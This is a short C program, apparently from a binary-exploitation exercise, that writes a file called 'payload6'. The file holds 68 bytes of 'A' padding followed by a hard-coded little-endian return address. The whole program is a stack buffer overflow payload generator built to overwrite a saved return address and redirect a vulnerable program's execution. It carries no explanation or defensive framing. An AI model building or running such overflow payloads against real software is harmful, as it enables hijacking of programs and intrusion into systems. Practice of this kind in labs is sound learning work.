#include<stdio.h>

int main(){
    FILE *file = fopen("payload6", "w");

    char padding[68];
    char addr[4] = {0x3d, 0x12, 0x40, 0x00};

    if(file == NULL){
        perror("Failed to open file.\n");
        return 1;
    }

    /* Filling padding */
    for(int i = 0; i < 68; i++){
        padding[i] = 0x41;
    }

    fwrite(padding, sizeof(padding), 1, file);
    fwrite(addr, sizeof(addr), 1, file);

    fclose(file);

    return 0;
}
